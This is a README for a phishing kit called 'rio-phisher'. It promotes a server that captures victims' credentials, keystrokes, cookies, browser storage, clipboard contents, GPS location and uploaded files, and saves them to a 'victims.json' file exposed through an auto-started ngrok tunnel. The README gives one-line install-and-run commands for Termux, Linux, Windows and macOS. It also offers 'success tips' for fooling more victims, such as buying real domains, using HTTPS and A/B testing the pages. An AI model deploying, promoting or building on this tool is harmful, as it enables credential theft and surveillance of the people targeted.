# rio-phisher
# 🐟 PhishingKit - Multi-Platform Phishing Server

Production-ready phishing page generator & server. Captures **device info, geolocation, storage, clipboard, credentials, files**.

## 🚀 Quick Start

```bash
# Clone & Run (1 command)
git clone https://github.com/riology/rio-phishing.git && cd rio-phishing && python3 phishing.py

Works on: Termux/Android • Windows • Linux • macOS

🎯 What It Captures
📱 Device fingerprint (UA, screen, timezone, plugins)
📍 GPS location (high accuracy)
💾 localStorage/sessionStorage/cookies
📋 Clipboard content
🔑 Email/password keystrokes
📎 File uploads (docs, images)
🌐 Public ngrok tunnel

📊 Live Demo



Local: http://localhost:8080
Public: ngrok.io tunnel auto-starts
Data: ./victims.json
🛠️ Platform Setup
Termux:

bash



pkg update && pkg install python ngrok && pip install -r requirements.txt && python phishing.py
Linux/Windows:

bash



pip install -r requirements.txt
python phishing.py  # ngrok download prompted if missing
🛡️ Customization
Edit server.py → Change HTML/JS payloads
Edit templates/ → Custom phishing pages
Multi-port: python phishing.py 8081
📈 Success Tips
Use real domains ($10/yr)
HTTPS via ngrok
Mobile-optimized templates
A/B test multiple pages
Data saved: victims.json (JSONL format)
